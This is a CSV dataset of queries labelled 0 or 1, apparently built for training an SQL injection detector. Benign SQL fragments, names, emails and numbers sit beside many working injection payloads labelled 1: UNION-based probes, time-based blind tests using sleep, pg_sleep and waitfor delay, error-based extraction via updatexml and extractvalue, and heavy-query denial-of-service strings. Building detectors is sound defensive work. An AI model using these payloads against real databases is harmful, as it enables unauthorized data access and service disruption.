Query,Label
"SELECT * FROM attack WHERE walk BETWEEN ""jet"" AND    ""dog""",0
-2411 or   (  8459  =  8459  )  *4906# pxwg,1
"1%""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
"   SELECT salmon, winter+ ', ' + strange+ ' ' + poor+ ', ' + stronger AS board  FROM exact",0
mcguinness.clayburgh7@eldeseodepecar.gu,0
"1""  )   where 7753  =  7753",1
1157,0
lehmann cruanas,0
zlotnick,0
34116,0
sarmiento,0
SELECT AVG ( eventually ) FROM sit SELECT SUM ( quick ) ,0
SELECT * FROM safe WHERE wooden BETWEEN shorter09/01/1996exercise AND fireplace15/31/1996information,0
09899393d,0
SELECT * FROM baby WHERE cast NOT LIKE 'twenty%',0
"  SELECT * FROM hang WHERE fifteen NOT IN  ( 'three', 'speech', 'furniture' )  ",0
1'  )   as hcpp where 1863  =  1863,1
SELECT AVG ( me ) FROM physical,0
handal hach,0
pettingill@demasiado.com.bv,0
FROM  ( SELECT DISTINCT sit FROM create ) ,0
"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",1
SELECT include ( s )  FROM egg FULL OUTER JOIN,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367581 ) ,0
"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",1
"1' in boolean mode  )   union all select null,null,null--",1
"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"-4427'   )    )    union all select 6357,6357,6357,6357,6357#",1
1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1
SELECT * FROM stared WHERE bottom = 'grandmother' FETCH FIRST 3 ROWS ONLY,0
-8716'  )   where 5523  =  5523 or 3686  =  8485--,1
"1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||'",1
66702102d,0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID IN  ( 28074 )  AND wp_posts.post_type  =  'nav_menu_item' AND   (  (  wp_posts.post_status  =  'publish'  )  )   ORDER BY wp_posts.menu_order ASC,0
SELECT * FROM truth WHERE said = 'five' LIMIT 3,0
SELECT * FROM active 3,0
burns40,0
SELECT TOP 50 PERCENT * FROM instance SELECT * FROM widely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pack,0
42855301e,0
DELETE FROM wooden,0
"-6798%""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1
1'+  (  select 'ljtl' where 1766  =  1766,1
"SELECT * FROM search WHERE tea BETWEEN ""struggle"" AND    ""fire""",0
"1   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  6312  =  6312",1
"1   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  5199  =  5199",1
whipp@esmeraldas.org.tm,0
"  SELECT softlyID AS ID, understanding AS discussion FROM type",0
"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",1
" SELECT column_name ( s )  FROM saw,powder",0
"1""   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",1
1%'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  ',1
"calle can bordoi, 148",0
SELECT did ( s )  FROM dear LEFT JOIN,0
SELECT * FROM pictured WHERE shown = 'mix' FETCH FIRST 3 ROWS ONLY,0
" or 1  =  1 or """"  =  ",1
"   SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrdersFROM    ( OrdersINNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID ) ",0
1  )   where 6424  =  6424,1
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
50757533y,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
SELECT * FROM swam WHERE pencil BETWEEN 'rays' AND 'according',0
"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",1
SELECT * FROM related WHERE personal = 'search'  AND  ( please = 'she' OR into = 'paper' ) ,0
SELECT AVG ( sink ) FROM outline SELECT SUM ( neighborhood ) ,0
"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
6.83781E+15,0
"   SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp",0
"   SELECT rubber, difficulty, teethFROM dried WHERE magic  IS NOT NULL",0
SELECT * FROM market WHERE beautiful = 'thus'  OR crowd = 'is',0
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",1
-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304,1
SELECT * FROM line FETCH FIRST 50 PERCENT ROWS ONLY,0
altamiranda aragons,0
"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
waitfor delay '0:0:5' and   (  'eaxu'  =  'eaxu,1
select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,1
"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
pankiw,0
"INSERT INTO piano ( later, separate, teach, appropriate, idea, dish )  VALUES  ( 'experience', 'use'. return', 'doctor', 'audience', 'examine', 'opinion' )  ",0
"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1
SELECT COUNT ( fish )  FROM tobacco,0
SELECT * FROM calm WHERE plate IN  ( SELECT three FROM sun ) ,0
SELECT fire ( s )  FROM see FULL OUTER JOIN,0
 union   (  select @@version  )   --,1
SELECT minerals ( s )  FROM folks LEFT JOIN,0
"1%"" and 2805  =  1345",1
SELECT MIN ( bus )  AS bus FROM build,0
DELETE FROM stomach WHERE memory = 'later',0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm",1
SELECT * FROM done WHERE center = 'forty',0
25793872q,0
" select * from users where id  =  1 or "";{"" or 1  =  1 -- 1",1
"1'  )   as dvoy where 7906  =  7906 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"SELECT * FROM prize WHERE had BETWEEN ""ice"" AND    ""asleep""",0
1' and 2908  =  8067--,1
" SELECT column_name ( s )  FROM magnet,cannot",0
galce,0
31439,0
42462633x,0
SELECT * FROM excitement 3 SELECT * FROM railroad,0
"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",1
"c/ berruguete 23,",0
"   SELECT thy, think, paint FROM cast WHERE top  IS NULL",0
limpi$aas,0
-3867%'  )   or 3084  =  5633 and   (  '%'  =  ',1
" SELECT * FROM certainly ORDER BY dozen, disease",0
"  SELECT * FROM garage WHERE exactly IN  ( 'above', 'shut', 'becoming' )  ",0
SELECT drive FROM wheel UNION SELECT slip FROM neck ORDER BY wave,0
SELECT * FROM key WHERE hole BETWEEN upward09/01/1996body AND remain15/31/1996stopped,0
SELECT drew,0
FROM  ( SELECT DISTINCT butter FROM class ) ,0
"1%'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",1
SELECT help ( s )  FROM particular,0
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf",1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
bauer,0
" SELECT * FROM everywhere ORDER BY imagine ASC, nodded DESC",0
tebbe,0
1  )   where 4573  =  4573,1
38980059g,0
"  SELECT sand,sitting,acres FROM troops LEFT JOIN Orders ON pound.shoeID =  half.future ORDER BY was.into",0
aguarn,0
SELECT * FROM protection WHERE    NOT everybody = 'able',0
"iif  (  3548  =  8646,1,1/0  )  ",1
SELECT COUNT ( carried ) FROM wheat,0
"1%""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1
"   SELECT COUNT ( completely ) , hole FROM experiment BY graph",0
9600,0
demonlatra,0
SELECT * FROM word WHERE is BETWEEN education09/01/1996elephant AND twelve15/31/1996cut,0
SELECT TOP 3 * FROM heavy SELECT * FROM hide 3SELECT * FROM are,0
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1
SELECT * FROM brain WHERE    NOT service = 'official',0
8.64151E+15,0
SELECT below ( s FROM getting RIGHT JOIN,0
"1   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   4348  =  4348",1
"   SELECT COUNT ( negative ) , mad FROM bend BY story",0
morgenstern9@laschinas.ba,0
"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
" SELECT column_name ( s )  FROM curious,bus",0
SELECT slope ( s )  FROM lying,0
"  SELECT * FROM location WHERE arrive IN  ( 'engineer', 'recall', 'writer' )  ",0
SELECT TOP 50 PERCENT * FROM oxygen,0
1'||  (  select 'tjzy' where 3037  =  3037,1
SELECT scientist ( s )  FROM shop SELECT author ( s ) ,0
SELECT * FROM surrounded FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM tightly WHERE negative  BETWEEN 10 AND 20,0
"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
linton,0
"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""kpwc"" like ""kpwc",1
"1'  )   as uvxl where 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
SELECT * FROM also FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM powder,0
46269,0
nagyszeder.kehoe@creacionesacampada.es,0
SELECT * FROM Customers GO;  EXEC SelectAllCustomers;,0
"-1631%""  )   or elt  (  8285  =  1709,1709  )   and   (  ""%""  =  """,1
SELECT * FROM or WHERE may = 'box' LIMIT 3,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",1
-1304'  )   union all select 7639#,1
"  SELECT * FROM replace WHERE subject IN  ( 'managed', 'past', 'name' )  ",0
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
benigni@viajesdacapalla.pa,0
SELECT alike ( s )  FROM life UNION ALL,0
1   )    )    and   (  3020  =  3020  )  *6703 and    (    (   3078  =  3078,1
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh",1
@,1
SELECT * FROM ten WHERE corn BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM prize 3,0
-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,1
1.1363E+15,0
-4595'  )   where 4892  =  4892 order by 1--,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and '%'  =  '",1
SELECT * FROM small WHERE silly BETWEEN 'term' AND 'information',0
"1'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM escape WHERE everybody = 'action' LIMIT 3,0
"1%'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '%'  =  '",1
"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",1
SELECT find ( s ) FROM produce INNER JOIN,0
a65esad0,0
"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",1
" SELECT * FROM well ORDER BY pile ASC, child DESC",0
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""cgps"" like ""cgps",1
"INSERT INTO remove ( scale, facing, troops, select, he, grabbed )  VALUES  ( 'press', 'wind'. space', 'slow', 'alone', 'throughout', 'visit' )  ",0
SELECT * FROM dish WHERE west IN  ( SELECT army FROM laugh ) ,0
SELECT COUNT ( border )  FROM support,0
"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",1
SELECT MIN ( she )  AS his FROM spell,0
"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq",1
password:*/  =  1--,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 181 )  ORDER BY meta_id ASC",0
"1%'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
bakey_noah@inmobiliariahangar.ki,0
"c/ comedias, 109,",0
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",1
1' where 2911  =  2911,1
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",1
end and    (    (     (  'nhub'  =  'nhub,1
SELECT sentence ( s )  FROM good SELECT play ( s ) ,0
to2adora,0
SELECT TOP 3 * FROM danger WHERE rocky = 'better',0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",1
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh",1
"  SELECT Orders.headedrID, Employees.would, Employees.rays FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.nineID ORDER BY Orders.smallestID",0
"pasaje maria merida s/n, 4?h",0
SELECT advice FROM heart UNION ALL SELECT rhyme FROM room ORDER BY felt,0
1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,1
SELECT * FROM brief WHERE lesson NOT BETWEEN 'chose' AND 'sent',0
if  (  6767  =  5022  )   select 6767 else drop function buii--,1
5.9335E+15,0
"1%"" or sleep  (  5  )   and ""%""  =  """,1
1'   )    )    as egsj where 3447  =  3447,1
SELECT * FROM blue WHERE suit NOT LIKE 'nearest%',0
6.14046E+15,0
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1
1  )   as qgsb where 7600  =  7600 and 2006  =  2006,1
"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1
"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",1
 or 1/*,1
3.36323E+15,0
eliseo,0
777t1c4rio,0
SELECT TOP 3 * FROM religious WHERE police = 'raise' SELECT * FROM muscle,0
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT tool ( s )  FROM gray UNION ALL,0
02056001p,0
SELECT TOP 3 * FROM everyone SELECT * FROM music 3SELECT * FROM completely,0
brewton,0
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",1
1.27984E+15,0
august,0
SELECT MIN ( swim )  AS evening FROM breathe,0
"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",1
SELECT TOP 3 * FROM trunk WHERE great = 'mental' SELECT * FROM trick,0
SELECT listen ( s )  FROM trace SELECT whatever FROM aside,0
"-1889%'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1
"  SELECT Orders.yourselfrID, Employees.hit, Employees.birthday FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dutyID ORDER BY Orders.cabinID",0
